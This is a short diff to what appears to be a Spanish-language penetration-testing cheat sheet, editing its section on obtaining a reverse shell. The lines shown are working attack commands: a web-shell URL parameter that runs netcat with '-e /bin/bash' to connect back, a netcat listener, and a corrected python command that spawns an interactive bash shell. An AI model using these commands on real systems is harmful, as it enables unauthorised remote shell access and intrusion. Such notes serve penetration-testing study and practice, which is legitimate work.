@@ -196,7 +196,7 @@ Segun server, crear reverse shell diferente.
 		
 			. url/archivo.php?cmd=nc+127.0.0.1+4444+-e+%2Fbin%2Fbash
 			. nc -lvp 4444
-			. python -c 'import pty'; pty.spawn("/bin/sh")'
+			. python -c 'import pty; pty.spawn("/bin/bash")'
 			. export TERM=xterm
 
 ### SQL ###
